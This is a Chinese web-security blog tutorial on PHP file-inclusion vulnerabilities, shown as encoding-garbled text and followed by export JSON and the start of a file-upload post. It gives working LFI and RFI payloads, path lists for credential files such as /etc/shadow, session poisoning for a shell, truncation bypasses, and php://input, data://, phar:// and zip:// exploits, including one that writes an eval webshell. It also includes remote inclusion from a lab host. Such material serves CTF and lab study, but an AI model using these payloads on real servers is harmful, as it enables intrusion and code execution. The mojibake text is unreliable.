ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†æ–‡ä»¶åŒ…å«æ¼æ´åŠåˆ©ç”¨æ–¹å¼ï¼ æœ‰å…³åŒ…å«çš„å‡½æ•°PHPä¸­æ–‡ä»¶åŒ…å«å‡½æ•°æœ‰ä»¥ä¸‹å››ç§ï¼š include() include_once() require() require_once() includeå’ŒrequireåŒºåˆ«ä¸»è¦æ˜¯ï¼Œincludeåœ¨åŒ…å«çš„è¿‡ç¨‹ä¸­å¦‚æœå‡ºç°é”™è¯¯ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç¨‹åºç»§ç»­æ­£å¸¸è¿è¡Œï¼›è€Œrequireå‡½æ•°å‡ºç°é”™è¯¯çš„æ—¶å€™ï¼Œä¼šç›´æ¥æŠ¥é”™å¹¶é€€å‡ºç¨‹åºçš„æ‰§è¡Œã€‚ è€Œinclude_once()ï¼Œrequire_once()è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œä¸å‰ä¸¤ä¸ªçš„ä¸åŒä¹‹å¤„åœ¨äºè¿™ä¸¤ä¸ªå‡½æ•°åªåŒ…å«ä¸€æ¬¡ï¼Œé€‚ç”¨äºåœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒä¸€ä¸ªæ–‡ä»¶æœ‰å¯èƒ½è¢«åŒ…æ‹¬è¶…è¿‡ä¸€æ¬¡çš„æƒ…å†µä¸‹ï¼Œä½ æƒ³ç¡®ä¿å®ƒåªè¢«åŒ…æ‹¬ä¸€æ¬¡ä»¥é¿å…å‡½æ•°é‡å®šä¹‰ï¼Œå˜é‡é‡æ–°èµ‹å€¼ç­‰é—®é¢˜ã€‚ æœ¬åœ°åŒ…å«LFI(Local File Inclusion)æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´æµ‹è¯•ä»£ç ï¼š 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; é€šè¿‡ç›®å½•éå†æ¼æ´å¯ä»¥è·å–åˆ°ç³»ç»Ÿä¸­å…¶ä»–æ–‡ä»¶çš„å†…å®¹ï¼š å¸¸è§çš„æ•æ„Ÿä¿¡æ¯è·¯å¾„ï¼š Windowsç³»ç»Ÿ 1234567891011c:\\boot.ini &#x2F;&#x2F; æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬c:\\windows\\system32\\inetsrv\\MetaBase.xml &#x2F;&#x2F; IISé…ç½®æ–‡ä»¶c:\\windows\\repair\\sam &#x2F;&#x2F; å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç c:\\ProgramFiles\\mysql\\my.ini &#x2F;&#x2F; MySQLé…ç½®c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD &#x2F;&#x2F; MySQL rootå¯†ç c:\\windows\\php.ini &#x2F;&#x2F; php é…ç½®ä¿¡æ¯ Linux/Unixç³»ç»Ÿ 12345678910111213&#x2F;etc&#x2F;passwd &#x2F;&#x2F; è´¦æˆ·ä¿¡æ¯&#x2F;etc&#x2F;shadow &#x2F;&#x2F; è´¦æˆ·å¯†ç æ–‡ä»¶&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2é»˜è®¤é…ç½®æ–‡ä»¶&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; è™šæ‹Ÿç½‘ç«™é…ç½®&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHPç›¸å…³é…ç½®&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apacheé…ç½®æ–‡ä»¶&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql é…ç½®æ–‡ä»¶ sessionæ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨æ¡ä»¶ï¼šsessionçš„å­˜å‚¨ä½ç½®å¯ä»¥è·å– é€šè¿‡phpinfoçš„ä¿¡æ¯å¯ä»¥è·å–åˆ°sessionçš„å­˜å‚¨ä½ç½®ã€‚é€šè¿‡phpinfoçš„ä¿¡æ¯ï¼Œè·å–åˆ°session.save_pathä¸º/var/lib/php/sessionï¼š è·å–åˆ°sessionçš„å­˜å‚¨ä½ç½® é€šè¿‡çŒœæµ‹é»˜è®¤çš„sessionå­˜æ”¾ä½ç½®è¿›è¡Œå°è¯•ã€‚å¦‚linuxä¸‹é»˜è®¤å­˜å‚¨åœ¨/var/lib/php/sessionç›®å½•ä¸‹ï¼š sessionä¸­çš„å†…å®¹å¯ä»¥è¢«æ§åˆ¶ï¼Œä¼ å…¥æ¶æ„ä»£ç ã€‚ ç¤ºä¾‹ï¼š 123456789&lt;?phpsession_start();$ctfs&#x3D;$_GET[&#39;ctfs&#39;];$_SESSION[&quot;username&quot;]&#x3D;$ctfs;?&gt; æ¼æ´åˆ†æ: æ­¤phpä¼šå°†è·å–åˆ°çš„GETå‹ctfså˜é‡çš„å€¼å­˜å…¥åˆ°sessionä¸­ã€‚ å½“è®¿é—®http://www.ctfs-wiki/session.php?ctfs=ctfs åï¼Œä¼šåœ¨/var/lib/php/sessionç›®å½•ä¸‹å­˜å‚¨sessionçš„å€¼ã€‚ sessionçš„æ–‡ä»¶åä¸ºsess_+sessionidï¼Œsessionidå¯ä»¥é€šè¿‡å¼€å‘è€…æ¨¡å¼è·å–ã€‚ æ‰€ä»¥sessionçš„æ–‡ä»¶åä¸ºsess_akp79gfiedh13ho11i6f3sm6s6ã€‚ åˆ°æœåŠ¡å™¨çš„/var/lib/php/sessionç›®å½•ä¸‹æŸ¥çœ‹æœç„¶å­˜åœ¨æ­¤æ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼š username|s:4:&quot;ctfs&quot;; [root@c21336db44d2 session]# cat sess_akp79gfiedh13ho11i6f3sm6s6 username|s:4:&quot;ctfs&quot; æ¼æ´åˆ©ç”¨ é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œå¯ä»¥çŸ¥é“ctfsä¼ å…¥çš„å€¼ä¼šå­˜å‚¨åˆ°sessionæ–‡ä»¶ä¸­ï¼Œå¦‚æœå­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°±å¯ä»¥é€šè¿‡ctfså†™å…¥æ¶æ„ä»£ç åˆ°sessionæ–‡ä»¶ä¸­ï¼Œç„¶åé€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œæ­¤æ¶æ„ä»£ç getshellã€‚ å½“è®¿é—®http://www.ctfs-wiki/session.php?ctfs=&lt;?php phpinfo();?&gt;åï¼Œä¼šåœ¨/var/lib/php/sessionç›®å½•ä¸‹å­˜å‚¨sessionçš„å€¼ [root@6da845537b27 session]# cat sess_83317220159fc31cd7023422f64bea1a username|s:18:&quot;&lt;?php phpinfo();?&gt;&quot;; æ”»å‡»è€…é€šè¿‡phpinfo()ä¿¡æ¯æ³„éœ²æˆ–è€…çŒœæµ‹èƒ½è·å–åˆ°sessionå­˜æ”¾çš„ä½ç½®ï¼Œæ–‡ä»¶åç§°é€šè¿‡å¼€å‘è€…æ¨¡å¼å¯è·å–åˆ°ï¼Œç„¶åé€šè¿‡æ–‡ä»¶åŒ…å«çš„æ¼æ´è§£ææ¶æ„ä»£ç getshellã€‚ æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡%00æˆªæ–­æ¡ä»¶ï¼šmagic_quotes_gpc = Off phpç‰ˆæœ¬&lt;5.3.4 æµ‹è¯•ä»£ç ï¼š 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename . &quot;.html&quot;);?&gt; æµ‹è¯•ç»“æœï¼š http://www.ctfs-wiki.com/FI/FI.php?filename=../../../../../../../boot.ini%00 è·¯å¾„é•¿åº¦æˆªæ–­æ¡ä»¶ï¼šwindows OSï¼Œç‚¹å·éœ€è¦é•¿äº256ï¼›linux OS é•¿äº4096 Windowsä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º256å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒï¼› Linuxä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º4096å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒã€‚ æµ‹è¯•ä»£ç ï¼š 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename . &quot;.html&quot;);?&gt; EXP: http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././ ç‚¹å·æˆªæ–­æ¡ä»¶ï¼šwindows OSï¼Œç‚¹å·éœ€è¦é•¿äº256 æµ‹è¯•ä»£ç ï¼š 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename . &quot;.html&quot;);?&gt; EXP: http://www.ctfs-wiki.com/FI/FI.phpï¼Ÿfilename=test.txt................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................. è¿œç¨‹åŒ…å«RFI(Remote File Inclusion)PHPçš„é…ç½®æ–‡ä»¶allow_url_fopenå’Œallow_url_includeè®¾ç½®ä¸ºONï¼Œinclude/requireç­‰åŒ…å«å‡½æ•°å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶ï¼Œå¦‚æœè¿œç¨‹æ–‡ä»¶æ²¡ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œå¯¼è‡´äº†æ‰§è¡Œæ¶æ„æ–‡ä»¶çš„ä»£ç ï¼Œè¿™å°±æ˜¯è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ã€‚ allow_url_fopen = Onï¼ˆæ˜¯å¦å…è®¸æ‰“å¼€è¿œç¨‹æ–‡ä»¶ï¼ŒPHP&lt;5.2é»˜è®¤æ‰“å¼€ï¼Œï¼‰ allow_url_include = Onï¼ˆæ˜¯å¦å…è®¸include/requireè¿œç¨‹æ–‡ä»¶ï¼Œé»˜è®¤å…³é—­ï¼‰ æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´æµ‹è¯•ä»£ç ï¼š 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; é€šè¿‡è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ŒåŒ…å«php.txtå¯ä»¥è§£æã€‚ http://www.ctfs-wiki.com/FI/FI.php?filename=http://192.168.91.133/FI/php.txt æµ‹è¯•ç»“æœï¼š æœ‰é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡æµ‹è¯•ä»£ç ï¼š &lt;?php include($_GET[&#39;filename&#39;] . &quot;.html&quot;); ?&gt; ä»£ç ä¸­å¤šæ·»åŠ äº†htmlåç¼€ï¼Œå¯¼è‡´è¿œç¨‹åŒ…å«çš„æ–‡ä»¶ä¹Ÿä¼šå¤šä¸€ä¸ªhtmlåç¼€ã€‚ é—®å·ç»•è¿‡http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt? #å·ç»•è¿‡http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%23 è¿˜æœ‰å“ªäº›å¯ä»¥ç»•è¿‡ï¼Ÿç”¨burpè·‘ä¸€éå‘ç°ç©ºæ ¼ä¹Ÿå¯ä»¥ç»•è¿‡ï¼š phpä¼ªåè®®PHP å¸¦æœ‰å¾ˆå¤šå†…ç½® URL é£æ ¼çš„å°è£…åè®®ï¼Œå¯ç”¨äºç±»ä¼¼ fopen()ã€ copy()ã€ file_exists() å’Œ filesize() çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ã€‚ é™¤äº†è¿™äº›å°è£…åè®®ï¼Œè¿˜èƒ½é€šè¿‡ stream_wrapper_register()æ¥æ³¨å†Œè‡ªå®šä¹‰çš„å°è£…åè®®ã€‚ ç›®å½• php:// è¾“å…¥è¾“å‡ºæµPHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚ php://filterï¼ˆæœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å–ï¼‰å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºâ€æ•°æ®æµæ‰“å¼€â€æ—¶çš„â€ç­›é€‰è¿‡æ»¤â€åº”ç”¨ï¼Œå¯¹æœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å†™ã€‚ ç”¨æ³•ï¼š ?filename=php://filter/convert.base64-encode/resource=xxx.php ?filename=php://filter/read=convert.base64-encode/resource=xxx.php ä¸€æ ·ã€‚ æ¡ä»¶ï¼šåªæ˜¯è¯»å–ï¼Œéœ€è¦å¼€å¯ allow_url_fopenï¼Œä¸éœ€è¦å¼€å¯ allow_url_includeï¼› æµ‹è¯•ä»£ç ï¼š 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; php://inputå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€‚å³å¯ä»¥ç›´æ¥è¯»å–åˆ°POSTä¸Šæ²¡æœ‰ç»è¿‡è§£æçš„åŸå§‹æ•°æ®ã€‚ enctype=â€multipart/form-dataâ€ çš„æ—¶å€™ php://inputæ˜¯æ— æ•ˆçš„ã€‚ ç”¨æ³•ï¼š ?file=php://input æ•°æ®åˆ©ç”¨POSTä¼ è¿‡å»ã€‚ php://input ï¼ˆè¯»å–POSTæ•°æ®ï¼‰ç¢°åˆ°file_get_contents()å°±è¦æƒ³åˆ°ç”¨php://inputç»•è¿‡ï¼Œå› ä¸ºphpä¼ªåè®®ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨httpåè®®çš„ï¼Œå³å¯ä»¥ä½¿ç”¨POSTæ–¹å¼ä¼ æ•°æ®ï¼Œå…·ä½“å‡½æ•°æ„ä¹‰ä¸‹ä¸€é¡¹ï¼› æµ‹è¯•ä»£ç ï¼š 123&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);?&gt; æµ‹è¯•ç»“æœï¼š php://inputï¼ˆå†™å…¥æœ¨é©¬ï¼‰æµ‹è¯•ä»£ç ï¼š 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; æ¡ä»¶ï¼šphpé…ç½®æ–‡ä»¶ä¸­éœ€åŒæ—¶å¼€å¯ allow_url_fopen å’Œ allow_url_includeï¼ˆPHP &lt; 5.3.0ï¼‰,å°±å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼Œåœ¨è¿™å¯ä»¥ç†è§£æˆè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆRFIï¼‰ï¼Œå³POSTè¿‡å»PHPä»£ç ï¼Œå³å¯æ‰§è¡Œã€‚ å¦‚æœPOSTçš„æ•°æ®æ˜¯æ‰§è¡Œå†™å…¥ä¸€å¥è¯æœ¨é©¬çš„PHPä»£ç ï¼Œå°±ä¼šåœ¨å½“å‰ç›®å½•ä¸‹å†™å…¥ä¸€ä¸ªæœ¨é©¬ã€‚ &lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt; æµ‹è¯•ç»“æœï¼š å¦‚æœä¸å¼€å¯allow_url_includeä¼šæŠ¥é”™ï¼š php://inputï¼ˆå‘½ä»¤æ‰§è¡Œï¼‰æµ‹è¯•ä»£ç ï¼š 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; æ¡ä»¶ï¼šphpé…ç½®æ–‡ä»¶ä¸­éœ€åŒæ—¶å¼€å¯ allow_url_fopen å’Œ allow_url_includeï¼ˆPHP &lt; 5.30ï¼‰,å°±å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼Œåœ¨è¿™å¯ä»¥ç†è§£æˆè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆRFIï¼‰ï¼Œå³POSTè¿‡å»PHPä»£ç ï¼Œå³å¯æ‰§è¡Œï¼› å¦‚æœä¸å¼€å¯allow_url_includeä¼šæŠ¥é”™ï¼š file://ä¼ªåè®® ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰é€šè¿‡fileåè®®å¯ä»¥è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œè¯»å–åˆ°æ–‡ä»¶çš„å†…å®¹ æµ‹è¯•ä»£ç ï¼š 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; data://ä¼ªåè®®æ•°æ®æµå°è£…å™¨ï¼Œå’Œphp://ç›¸ä¼¼éƒ½æ˜¯åˆ©ç”¨äº†æµçš„æ¦‚å¿µï¼Œå°†åŸæœ¬çš„includeçš„æ–‡ä»¶æµé‡å®šå‘åˆ°äº†ç”¨æˆ·å¯æ§åˆ¶çš„è¾“å…¥æµä¸­ï¼Œç®€å•æ¥è¯´å°±æ˜¯æ‰§è¡Œæ–‡ä»¶çš„åŒ…å«æ–¹æ³•åŒ…å«äº†ä½ çš„è¾“å…¥æµï¼Œé€šè¿‡ä½ è¾“å…¥payloadæ¥å®ç°ç›®çš„ï¼› data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4 data://ï¼ˆè¯»å–æ–‡ä»¶ï¼‰ å’Œphpä¼ªåè®®çš„inputç±»ä¼¼ï¼Œç¢°åˆ°file_get_contents()æ¥ç”¨ï¼› &lt;?php // æ‰“å° â€œI love PHPâ€ echo file_get_contents(â€˜data://textplain;base64,SSBsb3ZlIFBIUAo=â€™); ?&gt; æ³¨æ„ï¼š&lt;span style=&quot;color: rgb(121, 121, 121);&quot;&gt;&lt;?php phpinfo();,è¿™ç±»æ‰§è¡Œä»£ç æœ€åæ²¡æœ‰?&gt;&lt;/span&gt;é—­åˆ; å¦‚æœphp.inié‡Œçš„allow_url_include=Onï¼ˆPHP &lt; 5.3.0ï¼‰,å°±å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼ŒåŒç†åœ¨è¿™å°±å¯ä»¥ç†è§£æˆè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆRFIï¼‰ æµ‹è¯•ä»£ç ï¼š 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; phar://ä¼ªåè®®è¿™ä¸ªå‚æ•°æ˜¯å°±æ˜¯phpè§£å‹ç¼©åŒ…çš„ä¸€ä¸ªå‡½æ•°ï¼Œä¸ç®¡åç¼€æ˜¯ä»€ä¹ˆï¼Œéƒ½ä¼šå½“åšå‹ç¼©åŒ…æ¥è§£å‹ã€‚ ç”¨æ³•ï¼š ?file=phar://å‹ç¼©åŒ…/å†…éƒ¨æ–‡ä»¶ phar://xxx.png/shell.php æ³¨æ„ï¼š PHP &gt; =5.3.0 å‹ç¼©åŒ…éœ€è¦æ˜¯zipåè®®å‹ç¼©ï¼Œrarä¸è¡Œï¼Œå°†æœ¨é©¬æ–‡ä»¶å‹ç¼©åï¼Œæ”¹ä¸ºå…¶ä»–ä»»æ„æ ¼å¼çš„æ–‡ä»¶éƒ½å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚ æ­¥éª¤ï¼š å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬æ–‡ä»¶shell.phpï¼Œç„¶åç”¨zipåè®®å‹ç¼©ä¸ºshell.zipï¼Œç„¶åå°†åç¼€æ”¹ä¸ºpngç­‰å…¶ä»–æ ¼å¼ã€‚ æµ‹è¯•ä»£ç ï¼š 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; zip://ä¼ªåè®®zipä¼ªåè®®å’Œpharåè®®ç±»ä¼¼ï¼Œä½†æ˜¯ç”¨æ³•ä¸ä¸€æ ·ã€‚ ç”¨æ³•ï¼š ?file=zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å] zip://xxx.png#shell.phpã€‚ æ¡ä»¶ï¼š PHP &gt; =5.3.0ï¼Œæ³¨æ„åœ¨windowsä¸‹æµ‹è¯•è¦5.3.0&lt;PHP&lt;5.4 æ‰å¯ä»¥ #åœ¨æµè§ˆå™¨ä¸­è¦ç¼–ç ä¸º%23ï¼Œå¦åˆ™æµè§ˆå™¨é»˜è®¤ä¸ä¼šä¼ è¾“ç‰¹æ®Šå­—ç¬¦ã€‚ æµ‹è¯•ä»£ç ï¼š 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; æ–‡ä»¶åŒ…å«çš„ä¸€äº›éªšæ“ä½œåŒ…å«ä¸€äº›æ•æ„Ÿæ–‡ä»¶/proc/self/environæ–‡ä»¶ï¼š å‘User-Agentå¤´ä¸­æ³¨å…¥PHPä»£ç ï¼ŒåŒ…å«æˆåŠŸå°±èƒ½å¾—åˆ°shell è¿™ä¸ª self ä¸è¦ä»¥ä¸ºå°±æ˜¯ self æ–‡ä»¶å¤¹ï¼Œå®é™…ä¸Šå­ç›®å½•/proc/selfæœ¬èº«å°±æ˜¯å½“å‰è¿è¡Œè¿›ç¨‹ PID è´ªå©ªåŒ…å«ä¸€ä¸ªpayload: 1?img&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;..&#x2F;flag.php|jpg data://åè®®åˆ©ç”¨æ¡ä»¶ï¼š 1ã€php ç‰ˆæœ¬å¤§äºç­‰äº php5.2 2ã€allow_url_fopen = On 3ã€allow_url_include = On åˆ©ç”¨ data:// ä¼ªåè®®è¿›è¡Œä»£ç æ‰§è¡Œçš„æ€è·¯åŸç†å’Œ php:// æ˜¯ç±»ä¼¼çš„ï¼Œéƒ½æ˜¯åˆ©ç”¨äº† PHP ä¸­çš„æµçš„æ¦‚å¿µï¼Œå°†åŸæœ¬çš„ include çš„æ–‡ä»¶æµé‡å®šå‘åˆ°äº†ç”¨æˆ·å¯æ§åˆ¶çš„è¾“å…¥æµä¸­ 123?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo();?&gt;?file&#x3D;data:text&#x2F;plain;base64,base64ç¼–ç çš„payloadindex.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b åŠ å· + çš„ url ç¼–ç ä¸º %2bï¼ŒPD9waHAgcGhwaW5mbygpOz8+ çš„ base64 è§£ç ä¸ºï¼š&lt;?php phpinfo();?&gt; è·¯å¾„é•¿åº¦æˆªæ–­è¿™ä¸ªè¦æ±‚phpç‰ˆæœ¬&lt; 5.3.10 123456789&lt;?phpif (empty($_GET[&quot;file&quot;]))&#123; echo(&#x27;../flag.php&#x27;); return;&#125;else&#123; $filename=&#x27;pages/&#x27;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome.txt&quot;).&#x27;.html&#x27;; include $filename;&#125; flag æ–‡ä»¶æ”¾åœ¨ä¸Šå±‚ç›®å½• è¿™æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å­—ç¬¦ ./. å’Œ ./ æ¥è¿›è¡Œç»•è¿‡ï¼Œå› ä¸ºæ–‡ä»¶è·¯å¾„æœ‰é•¿åº¦é™åˆ¶ windows 259 ä¸ª bytes linux 4096 ä¸ª bytes å‚è€ƒï¼šhttps://www.freebuf.com/articles/web/182280.html","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"http://www.m00nback.xyz/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"æ–‡ä»¶ä¸Šä¼ åŠå…¶åˆ©ç”¨æ–¹å¼","slug":"file-upload-leak","date":"2019-09-10T12:40:10.000Z","updated":"2019-10-17T05:54:30.410Z","comments":true,"path":"2019/09/10/file-upload-leak/","link":"","permalink":"http://www.m00nback.xyz/2019/09/10/file-upload-leak/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†æ–‡ä»¶ä¸Šä¼ æ¼æ´åŠä¸€äº›å¸¸è§çš„åˆ©ç”¨æ–¹å¼ï¼ŒåŒ…æ‹¬ä¸€äº›ç®€å•çš„ç»•è¿‡æ–¹å¼ï¼Œä¸€äº›å¸¸è§çš„ç½‘ç«™å®¹å™¨è§£ææ¼æ´ï¼Œä»¥åŠå›¾ç‰‡é©¬çš„åˆ¶ä½œå’Œä½¿ç”¨ç­‰ç­‰ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†æ–‡ä»¶ä¸Šä¼ æ¼æ´åŠä¸€äº›å¸¸è§çš„åˆ©ç”¨æ–¹å¼ï¼ŒåŒ…æ‹¬ä¸€äº›ç®€å•çš„ç»•è¿‡æ–¹å¼ï¼Œä¸€äº›å¸¸è§çš„ç½‘ç«™å®¹å™¨è§£ææ¼æ´ï¼Œä»¥åŠå›¾ç‰‡é©¬çš„åˆ¶ä½œå’Œä½¿ç”¨ç­‰ç­‰ï¼ ç®€ä»‹æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡å¯¹ç”¨æˆ·æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†çš„æ§åˆ¶ä¸è¶³æˆ–è€…å¤„ç†ç¼ºé™·ï¼Œè€Œå¯¼è‡´çš„ç”¨æˆ·å¯ä»¥è¶Šè¿‡å…¶æœ¬èº«æƒé™å‘æœåŠ¡å™¨ä¸Šä¸Šä¼ å¯æ‰§è¡Œçš„åŠ¨æ€è„šæœ¬æ–‡ä»¶ã€‚è¿™é‡Œä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥æ˜¯æœ¨é©¬ï¼Œç—…æ¯’ï¼Œæ¶æ„è„šæœ¬æˆ–è€…WebShellç­‰ã€‚ å®¢æˆ·ç«¯æ ¡éªŒæœ¬åœ°jsæ£€æµ‹åœ¨ä¸Šä¼ æ—¶ï¼Œæ•°æ®è¿˜æœªå‘é€è¿‡å»ï¼Œä¾¿å‘å‡ºè­¦å‘Š ç»•è¿‡æ–¹æ³•ï¼š å…ˆå°†ä¸Šä¼ çš„æ–‡ä»¶æ”¹ä¸ºå¯ä»¥ä¸Šä¼ çš„æ‰©å±•åï¼Œä¸Šä¼ æ—¶ä½¿ç”¨Burpsuiteæ‹¦æˆªæ•°æ®åŒ…ï¼Œå°†æœ¨é©¬çš„æ‰©å±•åæ”¹ä¸ºåŸæ¥çš„php,å³å¯ç»•è¿‡å®¢æˆ·ç«¯çš„éªŒè¯ F12ä¿®æ”¹jsä»£ç  æœåŠ¡ç«¯æ ¡éªŒMIMEç±»å‹æ£€æµ‹MIMEç±»å‹æ˜¯ä»€ä¹ˆï¼Ÿ åœ¨æŠŠè¾“å‡ºç»“æœä¼ é€åˆ°æµè§ˆå™¨ä¸Šçš„æ—¶å€™ï¼Œæµè§ˆå™¨å¿…é¡»å¯åŠ¨åº”ç”¨ç¨‹åºæ¥å¤„ç†è¿™ä¸ªè¾“å‡ºæ–‡æ¡£ã€‚è¿™å¯ä»¥é€šè¿‡å¤šç§ç±»å‹MIMEï¼ˆå¤šåŠŸèƒ½ç½‘é™…é‚®ä»¶æ‰©å……åè®®ï¼‰æ¥å®Œæˆã€‚åœ¨HTTPä¸­ï¼ŒMIMEç±»å‹è¢«å®šä¹‰åœ¨Content-Type headerä¸­ã€‚ å¸¸è§çš„MIMEç±»å‹ï¼š .html text/html .txt text/plain .gif image/gif .jpg image/jpeg .png image/png ç»•è¿‡æ–¹æ³•ï¼š 